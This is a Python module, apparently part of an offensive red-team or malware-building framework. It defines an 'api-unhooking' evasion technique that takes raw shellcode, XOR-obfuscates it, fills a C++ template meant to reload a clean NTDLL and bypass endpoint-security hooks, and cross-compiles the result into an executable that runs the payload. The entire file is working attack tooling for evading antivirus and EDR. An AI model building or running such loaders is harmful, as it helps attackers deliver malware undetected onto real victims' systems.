import os
from jinja2 import Environment, FileSystemLoader
from core import EvasionTechnique
from utils.compiler import cross_compile_cpp
from utils.obfuscator import xor_encrypt # Using XOR for simplicity
from utils.helpers import format_shellcode_to_hex, get_output_path
from config import TEMPLATE_DIRS

class APIUnhooking(EvasionTechnique):
    def __init__(self):
        super().__init__(
            name="api-unhooking",
            description="Unhooks common NTDLL APIs by reloading a fresh copy and then executes shellcode.",
            options=[
                {'name': '--payload', 'type': 'str', 'required': True, 'help': 'Path to the raw shellcode file.'},
                {'name': '--output', 'type': 'str', 'required': True, 'help': 'Name of the output executable file.'}
                # Future extension: --dlls to specify DLLs to unhook, or --apis to specify functions.
                # For now, the C++ template will handle a default set (e.g., ntdll.dll functions).
            ]
        )

    def generate(self, **kwargs):
        payload_path = kwargs['payload']
        output_filename = kwargs['output']

        print(f"[*] Starting API Unhooking artifact generation: Output='{output_filename}'")

        # 1. Read shellcode
        try:
            with open(payload_path, 'rb') as f:
                shellcode = f.read()
        except FileNotFoundError:
            print(f"[!] Error: Payload file '{payload_path}' not found.")
            return
        except Exception as e:
            print(f"[!] Error reading payload file '{payload_path}': {e}")
            return

        if not shellcode:
            print(f"[!] Error: Payload file '{payload_path}' is empty.")
            return

        # 2. Obfuscate shellcode (XOR for this example)
        encrypted_shellcode, key = xor_encrypt(shellcode)
        hex_shellcode = format_shellcode_to_hex(encrypted_shellcode)
        print(f"[*] Shellcode obfuscated with XOR key: {key}")

        # 3. Render C++ template
        env = Environment(loader=FileSystemLoader(TEMPLATE_DIRS), trim_blocks=True, lstrip_blocks=True)
        try:
            template = env.get_template("unhooking_template.cpp") # Ensure this template exists
            cpp_code = template.render(
                shellcode_hex=hex_shellcode,
                xor_key=key
            )
        except Exception as e:
            print(f"[!] Error rendering C++ template (unhooking_template.cpp): {e}")
            return

        # 4. Compile the C++ code
        temp_dir = "/tmp" 
        if not os.path.exists(temp_dir):
            try:
                os.makedirs(temp_dir)
            except OSError as e_mkdir:
                print(f"[!] Error creating temp directory {temp_dir}: {e_mkdir}. Using current directory.")
                temp_dir = "."
        
        temp_source_path = os.path.join(temp_dir, f"{output_filename}.cpp")
        
        try:
            with open(temp_source_path, 'w') as f:
                f.write(cpp_code)
        except Exception as e:
            print(f"[!] Error writing temporary C++ source file '{temp_source_path}': {e}")
            return
        
        final_output_path = get_output_path(output_filename)
        print(f"[*] Compiling API Unhooking executable: {output_filename}...")
        if not cross_compile_cpp(temp_source_path, final_output_path):
            print(f"[!] API Unhooking executable '{output_filename}' compilation failed. Check logs. Temp source: {temp_source_path}")
            # Optionally keep temp_source_path for debugging
            return
        
        # 5. Cleanup
        try:
            if os.path.exists(temp_source_path):
                os.remove(temp_source_path)
        except Exception as e:
            print(f"[!] Warning: Failed to remove temporary source file '{temp_source_path}': {e}")

        if os.path.exists(final_output_path):
            print(f"[SUCCESS] API Unhooking executable generated successfully: {final_output_path}")
        else:
            print(f"[!] API Unhooking executable generation failed. Output file not found at {final_output_path}")
